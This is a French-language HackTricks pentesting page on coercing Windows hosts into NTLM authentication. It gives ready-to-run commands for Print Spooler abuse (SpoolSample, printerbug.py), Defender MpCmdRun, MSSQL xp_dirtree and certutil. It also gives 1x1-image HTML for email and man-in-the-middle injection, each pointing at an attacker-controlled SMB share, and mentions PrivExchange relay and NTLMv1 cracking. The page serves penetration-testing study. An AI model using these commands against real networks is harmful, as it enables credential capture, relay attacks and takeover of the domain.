# Forcer l'authentification privilégiée NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification à distance** codés en C# en utilisant le compilateur MIDL pour éviter les dépendances tierces.

## Abus du service Spouleur

Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des informations d'identification AD déjà connues pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouveaux travaux d'impression et lui demander simplement d'**envoyer la notification à un système**.\
Notez que lorsque l'imprimante envoie la notification à un système arbitraire, elle doit s'**authentifier** auprès de ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie auprès d'un système arbitraire, et le service **utilisera le compte de l'ordinateur** dans cette authentification.

### Recherche des serveurs Windows sur le domaine

À l'aide de PowerShell, obtenez une liste de boîtes Windows. Les serveurs sont généralement prioritaires, donc concentrons-nous là-dessus :
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Recherche des services Spooler en écoute

Utilisant une version légèrement modifiée de @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le service Spooler est en écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser rpcdump.py sur Linux et rechercher le protocole MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Demander au service de s'authentifier sur un hôte arbitraire

Vous pouvez compiler [**SpoolSample à partir d'ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**dementor.py de 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sur Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinaison avec la délégation sans contrainte

Si un attaquant a déjà compromis un ordinateur avec [la délégation sans contrainte](unconstrained-delegation.md), l'attaquant pourrait **faire en sorte que l'imprimante s'authentifie sur cet ordinateur**. En raison de la délégation sans contrainte, le **TGT** du **compte d'ordinateur de l'imprimante** sera **enregistré dans** la **mémoire** de l'ordinateur avec la délégation sans contrainte. Comme l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et l'exploiter ([Pass the Ticket](pass-the-ticket.md)).

## Authentification forcée RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

L'attaque `PrivExchange` résulte d'une faille dans la fonctionnalité `PushSubscription` du serveur Exchange, qui permet à **n'importe quel utilisateur de domaine disposant d'une boîte aux lettres de forcer le serveur Exchange à s'authentifier** sur n'importe quel hôte fourni par le client via HTTP.

Le service Exchange s'exécute en tant que **SYSTEM** et est **sur-privilegié** par défaut (c'est-à-dire qu'il dispose de privilèges WriteDacl sur le domaine avant la mise à jour cumulative 2019). Cette faille peut être exploitée pour **relayer vers LDAP et extraire la base de données NTDS du domaine**. Si nous ne pouvons pas relayer vers LDAP, cela peut être exploité pour relayer et s'authentifier sur **d'autres hôtes** dans le domaine. Cette attaque vous permettra d'accéder directement à l'administrateur de domaine avec n'importe quel compte d'utilisateur de domaine authentifié.

****[**Cette technique a été copiée à partir d'ici.**](https://academy.hackthebox.com/module/143/section/1276)****

## À l'intérieur de Windows

Si vous êtes déjà à l'intérieur de la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec :

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) est un système de gestion de base de données relationnelle développé par Microsoft. Il est largement utilisé dans les environnements d'entreprise pour stocker, gérer et analyser de grandes quantités de données. MSSQL offre des fonctionnalités avancées telles que la prise en charge du langage SQL, la gestion des transactions, la réplication des données et la sécurité des données. En tant que hacker, il est important de comprendre les vulnérabilités potentielles de MSSQL et les techniques d'attaque associées pour pouvoir les exploiter de manière efficace lors d'un test de pénétration.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Ou utilisez cette autre technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d'utiliser certutil.exe lolbin (binaire signé par Microsoft) pour forcer l'authentification NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injection HTML

### Par email

Si vous connaissez l'**adresse e-mail** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pouvez simplement lui envoyer un **e-mail avec une image de 1x1** telle que
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
et lorsqu'il l'ouvre, il essaiera de s'authentifier.

### MitM

Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML dans une page qu'il visualisera, vous pouvez essayer d'injecter une image comme celle-ci dans la page :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Si vous pouvez capturer des défis NTLMv1, lisez ici comment les cracker.\
_Rappelez-vous que pour cracker NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
